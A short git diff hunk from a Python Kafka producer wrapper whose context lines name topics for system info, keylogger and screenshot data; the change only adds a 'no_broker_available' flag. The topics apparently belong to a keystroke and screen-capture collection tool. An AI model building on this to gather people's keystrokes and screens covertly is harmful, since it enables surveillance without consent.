@@ -9,6 +9,7 @@ class KafkaProducerWrapper:
     SYSTEM_INFO_TOPIC = 'ro.popa.system-info.new'
     KEYLOGGER_TOPIC = 'ro.popa.keylogger.new'
     SCREENSHOT_TOPIC = 'ro.popa.screenshot.new'
+    no_broker_available = False
     """
     bootstrap_servers: list of kafka brokers
     example: [localhost:9092]
